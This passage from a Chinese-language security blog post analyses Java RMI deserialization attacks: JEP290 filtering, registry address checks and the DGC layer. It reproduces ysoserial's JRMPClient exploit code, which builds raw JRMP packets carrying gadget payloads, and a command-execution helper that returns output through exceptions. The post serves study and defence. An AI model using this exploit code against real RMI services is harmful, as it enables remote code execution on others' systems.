class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_exec</span><span class="params">(String var0)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//执行命令</span></span><br><span class="line">            Process var1 = Runtime.getRuntime().exec(var0);</span><br><span class="line">            <span class="comment">//解析执行结果</span></span><br><span class="line">            String var2 = readBytes(var1.getInputStream());</span><br><span class="line">            <span class="comment">//抛出异常到客户端</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"8888:"</span> + var2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var3.toString().indexOf(<span class="string">"8888"</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"8888:"</span> + <span class="keyword">new</span> String(var3.toString()) + <span class="string">"\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        do_exec(<span class="string">"cmd /c dir"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入文件，在调用文件，通过报错信息传递命令执行结果，也算是一种思路。</p><h3 id="JEP290修复"><a href="#JEP290修复" class="headerlink" title="JEP290修复"></a>JEP290修复</h3><p>在JEP290规范之后，即JAVA版本6u141, 7u131, 8u121之后，以上攻击就不奏效了。</p><p>在8u112，使用cc链5打一波，可以正常攻击</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wsgxjjj311d0qpai3.jpg" alt="jep290-8u112.png"></p><p>在8u161，使用cc链5攻击，就不可以了:<code>REJECTED</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wx05oxj31qs07agm4.jpg" alt="jep290-8u161.png"></p><p>在<code>sun.rmi.registry.RegistryImpl#registryFilter</code>处下断点，然后开始调试，往回看，可以发现过滤器是在<code>obj.readObject()</code>语句中的JDK底层进入的，这是JEP在底层实现过滤机制导致的。反序列化动作和过滤器机制都在readObject语句中，这样就不存在逻辑上的跳过、绕过过滤器。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16x44656j31hr102q9s.jpg" alt="registryFilter.png"></p><p>看<code>sun.rmi.registry.RegistryImpl#registryFilter</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Status <span class="title">registryFilter</span><span class="params">(FilterInfo var0)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//这里registryFilter为空跳过该判断</span></span><br><span class="line">    <span class="keyword">if</span> (registryFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Status var1 = registryFilter.checkInput(var0);</span><br><span class="line">        <span class="keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不允许输入流的递归层数超过20层，超过就报错</span></span><br><span class="line">    <span class="keyword">if</span> (var0.depth() &gt; <span class="number">20L</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//获取输入流序列化class类型到var2</span></span><br><span class="line">        Class var2 = var0.serialClass();</span><br><span class="line">        <span class="comment">//判断是否为null，null就报错</span></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//判断是否为数组类型</span></span><br><span class="line">            <span class="keyword">if</span> (var2.isArray()) &#123;</span><br><span class="line">                <span class="comment">//数组长度大于10000就报错</span></span><br><span class="line">                <span class="keyword">if</span> (var0.arrayLength() &gt;= <span class="number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="number">10000L</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//获取到数组中的成分类，假如是还是数组嵌套，继续获取</span></span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    var2 = var2.getComponentType();</span><br><span class="line">                &#125; <span class="keyword">while</span>(var2.isArray());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断是不是JAVA基元类型，就是 绕过Object类型参数 小章中的那些基本类</span></span><br><span class="line">            <span class="comment">//是基本类就允许</span></span><br><span class="line">            <span class="keyword">if</span> (var2.isPrimitive()) &#123;</span><br><span class="line">                <span class="keyword">return</span> Status.ALLOWED;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//判断我们的输入的序列化类型是否为以下的几类class白名单之中</span></span><br><span class="line">                <span class="comment">//如果我们输入的类属于下面这些白名单的类或超类，就返回ALLOWED</span></span><br><span class="line">                <span class="comment">//不然就返回REJECTED报错。</span></span><br><span class="line">                <span class="keyword">return</span> String.class != var2 &amp;&amp; </span><br><span class="line">                    !Number.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !Remote.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !Proxy.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !ActivationID.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !UID.class.isAssignableFrom(var2) ? </span><br><span class="line">                    Status.REJECTED : Status.ALLOWED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是我们发现我们传入的payload object是一个Remote.class接口呀，这样不是就是在白名单了么。</p><p>实际上一开始是可以通过过滤器检测，但是readobject会把对象一层层递归拆开一个个经过过滤器检查，最后在<code>AnnotationInvocationHandler</code>处就被白名单拦下来了。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16xsae5tj31bs0kz0u0.jpg" alt="reject.png"></p><p>也没有说有哪个链的payload刚好可以通过白名单，所以在JEP290之后对于注册端的攻击就被拦截了。</p><h3 id="注册端对于服务端地址校验的变动"><a href="#注册端对于服务端地址校验的变动" class="headerlink" title="注册端对于服务端地址校验的变动"></a>注册端对于服务端地址校验的变动</h3><p>在 RMI 反序列化一文中，我们有实验过：在默认情况下，服务端向注册端进行bind等操作，是会验证服务端地址是否被注册端允许的（默认是只信任本机地址）。</p><p>但是我们在上面利用过程中，<strong>攻击者（服务端）都不是受害者（注册端）的信任地址，为何没有被这个验证机制所拦截呢？</strong></p><p>原因是因为，这个<strong>注册端对于服务端的验证在反序列化操作之后</strong>：</p><p>我们以8u112为例来看代码：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16z6m443j314y0g70ua.jpg" alt="8u111服务端验证.png"></p><p><code>sun.rmi.registry.RegistryImpl#bind</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(String name, Remote obj)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//此处验证</span></span><br><span class="line">checkAccess(<span class="string">"Registry.bind"</span>);</span><br><span class="line"><span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">Remote curr = bindings.get(name);</span><br><span class="line"><span class="keyword">if</span> (curr != <span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> AlreadyBoundException(name);</span><br><span class="line">bindings.put(name, obj);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在8u141之后，JDK代码对于此处验证逻辑发生了变化：变成<strong>先验证再反序列化操作</strong>了，等于服务端攻击注册端变为不可用。</p><p>我们来看161与112的对比情况</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16zoxt9zj324i0hhn10.jpg" alt="161-112对比.png"></p><p>那么单单从验证服务端逻辑来说，8u141之后，服务端bind之类的打注册端变得不可利用。但是客户端lookup打注册端因为不需要验证，不受这个变动影响。</p><p>但是对比上面的版本JEP290的封堵，自从8u121，客户端lookup打，服务单bind打就都不可利用了。这边的改动其实意义不大，但是还是之前注意到过，领出来提一下。</p><blockquote><p>但是假如可以JEP290绕过了，这里就变得非常有意思了，8u141之后lookup可以利用，bind不能利用。</p></blockquote><h2 id="RMI-DGC层反序列化"><a href="#RMI-DGC层反序列化" class="headerlink" title="RMI DGC层反序列化"></a>RMI DGC层反序列化</h2><blockquote><p>网上的文章讲到RMI的DGC层，经常总结说到：是为了绕过RMI注册端jdk8u121后出现的白名单限制才出现的。</p><p>这也是对的，但是也不是完全对。一开始我也是因为ysoserial中的exploit模块和payload模块弄混了搞不清楚。在开始前我们需要区分：</p><p>ysoserial的payload JRMPClient 是为了绕过jdk8u121后出现的白名单限制。这利用到了DGC层，所以上面句话也是对的。</p><p>ysoserial的exploit JRMPClient 是可以直接利用DGC层攻击RMI注册端的，其基础原理跟ysoserial-RMIRegistryExploit几乎是一样的。同时这种攻击方式是绕过不过jdk8u121的。</p><p>我们接下来讲到的是 ysoserial的exploit JRMPClient。而payload JRMPClient与绕过jdk8u121将在下篇说到。</p></blockquote><h3 id="DGC客户端打DGC服务端"><a href="#DGC客户端打DGC服务端" class="headerlink" title="DGC客户端打DGC服务端"></a>DGC客户端打DGC服务端</h3><p>我们先来看与Bind攻击类似的另外一条更为底层的攻击路径：ysoserial的exploit JRMPClient 。</p><p>先来演示下攻击效果：依旧是8u111的ServerAndRegister起服务端 ，客户端使用yso的exploit JRMPClient 模块</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17020r99j31a00ojgnn.jpg" alt="exploit-JRMPClient.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg170jw0glj31230ddgns.jpg" alt="JRMP-8u111.png"></p><p>可以攻击成功。</p><p>那么回过头来看看原理：<a href="https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html" target="_blank" rel="noopener">DGC（Distributed Garbage Collection）——分布式垃圾回收机制</a>。</p><p>这个DGC是用于<strong>维护服务端中被客户端使用的远程引用才存在的</strong>。其中包括两个方法<strong>dirty</strong>和<strong>clean</strong>，简单来说：</p><ul><li>客户端想要使用服务端上的远程引用，使用dirty方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li><li>客户端不使用的时候，需要调用clean方法来清楚这个远程引用。</li></ul><p>由于我们的RMI服务就是基于远程引用的，其底层的远程引用维护就是就是使用DGC，起一个RMI服务必有DGC层。于是我们就打这个DGC服务。</p><blockquote><p>相对于RMIRegistryExploit模块，这个模块攻击范围更广因为RMI服务端或者RMI注册端都会开启DGC服务端。</p></blockquote><p>看看DGC服务端最后是哪里触发了反序列化执行：<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code></p><p>（跟<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>）极其类似</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="keyword">int</span> var3, <span class="keyword">long</span> var4)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//一样是一个dispatch用于分发作用的方法</span></span><br><span class="line">    <span class="comment">//固定接口hash校验</span></span><br><span class="line">    <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SkeletonMismatchException(<span class="string">"interface hash mismatch"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DGCImpl var6 = (DGCImpl)var1;</span><br><span class="line">        ObjID[] var7;</span><br><span class="line">        <span class="keyword">long</span> var8;</span><br><span class="line">        <span class="comment">//判断dirty和clean分支流</span></span><br><span class="line">        <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">            <span class="comment">//clean分支流</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="keyword">boolean</span> var40;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//从客户端提供的输入流取值</span></span><br><span class="line">                    ObjectInput var14 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//对于取值进行反序列化，***漏洞触发点***</span></span><br><span class="line">                    var7 = (ObjID[])var14.readObject();</span><br><span class="line">                    var8 = var14.readLong();</span><br><span class="line">                    var39 = (VMID)var14.readObject();</span><br><span class="line">                    var40 = var14.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">  <span class="comment">//进行clean操作，已经完成了攻击，之后操作已经不重要了。</span></span><br><span class="line">                var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//..省略部分无关操作</span></span><br><span class="line">            <span class="comment">//dirty方法分支流，跟clean在漏洞触发点上是一样没差的</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//从客户端提供的输入流取值</span></span><br><span class="line">                    ObjectInput var13 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//对于取值进行反序列化，***漏洞触发点***</span></span><br><span class="line">                    var7 = (ObjID[])var13.readObject();</span><br><span class="line">                    var8 = var13.readLong();</span><br><span class="line">                    var10 = (Lease)var13.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Lease var11 = var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">               <span class="comment">//..省略无关操作</span></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"invalid method number"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>一致的漏洞触发点，没问题。可以看到这里触发点的话无论是选dirty那条线还是clean那条线都是一样的。</p><p>那客户端怎样与服务端通讯呢，之前RMIRegistryExploit是<code>bind（name,payload）</code>这里插入payload，然后传输到服务端。</p><p><strong>DGC这里我们客户端在哪里可以插入payload？</strong></p><p>此处我自己并没有找到一个与<code>bind()</code>类似的封装好的方法，可以方便我们调试的直接发起一个DGC层的请求。但是我们在<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>处下一个断点，然后在<code>sun.rmi.transport.DGCImpl#dirty</code>下一个断点，调试github上的ServerAndRegister.java就可以得到这个DGC层的通讯客户端-服务端的过程（是在bind()绑定对象的时候产生的通讯）</p><blockquote><p>跟RMI-register这些一样，DGCImpl_Skel是服务端代码，DGCImpl_Stub是客户端代码；但是这两个class也跟我们之前说的一样（动态生成？），总之是无法下断点调试的。所以在其内部调用的其他方法下断点来调试。</p><p>然后感谢<a href="https://www.anquanke.com/post/id/204740" target="_blank" rel="noopener">这个老哥</a>给了个例子，客户端lookup也会产生DGC通讯。（其实大多操作都会有DGC，这里抄一下放在github中嘿嘿）但是仍然先来看ServerAndRegister.java的通讯</p></blockquote><p>DGC客户端处：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg170wu8s1j31lp0zbjww.jpg" alt="DGC客户端.png"></p><p>DGC服务端处：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg1712vjb7j31p20xrdl8.jpg" alt="DGC服务端.png"></p><p>根据客户端调用栈来回退到<code>DGCImpl_Stub</code>的<code>dirty</code>方法，去看应该在哪里插入payload（clean其实也一样）就看<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Lease <span class="title">dirty</span><span class="params">(ObjID[] var1, <span class="keyword">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//开启了一个连接，似曾相识的 669196253586618813L 在服务端也有</span></span><br><span class="line">            RemoteCall var5 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//获取连接的输入流</span></span><br><span class="line">                ObjectOutput var6 = var5.getOutputStream();</span><br><span class="line">                <span class="comment">//写入一个对象，在实现的本意中，这里是一个ID的对象列表ObjID[]</span></span><br><span class="line">                <span class="comment">//***这里就是我们payload写入的地方***</span></span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                <span class="comment">//------</span></span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var20);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">super</span>.ref.invoke(var5);</span><br><span class="line"></span><br><span class="line">            Lease var24;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectInput var9 = var5.getInputStream();</span><br><span class="line">                var24 = (Lease)var9.readObject();</span><br><span class="line">            <span class="comment">//省略大量错误处理..</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们就找到了DGC客户端该放payload的地方，和DGC服务端触发反序列化的地方。</p><p>接下就是去实现一个POC，把payload放进去。可以发现我们去寻找的DGC客户端该放payload的地方调用栈很深，这代表着我们从顶层开始传输payload一直到我们想要放置payload的参数，payload不变可能性极低或难度极大。所以针对这种很底层的payload的poc构建通常使用自实现一个客户端去拼接序列化数据包。</p><p>Ysoserial的JRMP-Client exploit模块就是这么实现的，其核心在于<code>makeDGCCall</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入目标RMI注册端（也是DGC服务端）的IP端口，以及攻击载荷的payload对象。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeDGCCall</span> <span class="params">( String hostname, <span class="keyword">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException </span>&#123;</span><br><span class="line">        InetSocketAddress isa = <span class="keyword">new</span> InetSocketAddress(hostname, port);</span><br><span class="line">        Socket s = <span class="keyword">null</span>;</span><br><span class="line">        DataOutputStream dos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//建立一个socket通道，并为赋值</span></span><br><span class="line">            s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">            s.setKeepAlive(<span class="keyword">true</span>);</span><br><span class="line">            s.setTcpNoDelay(<span class="keyword">true</span>);</span><br><span class="line">   <span class="comment">//读取socket通道的数据流</span></span><br><span class="line">            OutputStream os = s.getOutputStream();</span><br><span class="line">            dos = <span class="keyword">new</span> DataOutputStream(os);</span><br><span class="line">   <span class="comment">//*******开始拼接数据流*********</span></span><br><span class="line">            <span class="comment">//以下均为特定协议格式常量，之后会说到这些数据是怎么来的</span></span><br><span class="line">            <span class="comment">//传输魔术字符：0x4a524d49（代表协议）</span></span><br><span class="line">            dos.writeInt(TransportConstants.Magic);</span><br><span class="line">            <span class="comment">//传输协议版本号：2（就是版本号）</span></span><br><span class="line">            dos.writeShort(TransportConstants.Version);</span><br><span class="line">            <span class="comment">//传输协议类型: 0x4c (协议的种类，好像是单向传输数据，不需要TCP的ACK确认)</span></span><br><span class="line">            dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">   <span class="comment">//传输指令-RMI call：0x50</span></span><br><span class="line">            dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">            <span class="meta">@SuppressWarnings</span> ( <span class="string">"resource"</span> )</span><br><span class="line">            <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> MarshalOutputStream(dos);</span><br><span class="line">   <span class="comment">//DGC的固定读取格式，等会具体分析</span></span><br><span class="line">            objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">            objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">            objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">            objOut.writeShort(<span class="number">0</span>);</span><br><span class="line">   <span class="comment">//选取DGC服务端的分支选dirty</span></span><br><span class="line">            objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">            <span class="comment">//然后一个固定的hash值</span></span><br><span class="line">            objOut.writeLong(-<span class="number">669196253586618813L</span>);</span><br><span class="line">            <span class="comment">//我们的反序列化触发点</span></span><br><span class="line">            objOut.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">            os.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>简单分析了一下POC数据包的构成，但是还是尝试搞清楚为什么是这个拼接顺序，为什么要这个值，感觉好玩一些。</p><p>我们可以通过在DGC服务端，CC链最终的触发处<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>处下一个断点，然后客户端使用YSO的exploit JRMPClient攻击服务端，从而得到受攻击服务端的调用栈，然后再回过头分析。</p><p>可以得到下面调用栈，在1-5的地方均有POC生成序列化数据必须满足的条件。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171ak79qj30qe0y1aes.jpg" alt="JRMPClient调用栈.png"></p><p>具体的因为好玩画了一张POC与服务端解析位置一一对应的图，图中有具体的反序列化点的方法以及行数同时用Qx来做了对应。（呼，1个小时作图..真爽，协议可以参考<a href="https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html" target="_blank" rel="noopener">官方文档</a>）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171jcemgj32bc1jkatw.jpg" alt="YSO-EXPLOIT-JRMPClient解析.png"></p><p>payload触发点没有在上面的图上，因为之前刚分析过了在<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>，这里没放进去。</p><p>此外DGC固定读取格式也是固定的，在<code>sun.rmi.transport.Transport#serviceCall</code>读取了参数之后进行了校验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     id = ObjID.read(call.getInputStream());</span><br><span class="line"> &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"unable to read objID"</span>, e);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* get the remote object */</span></span><br><span class="line"><span 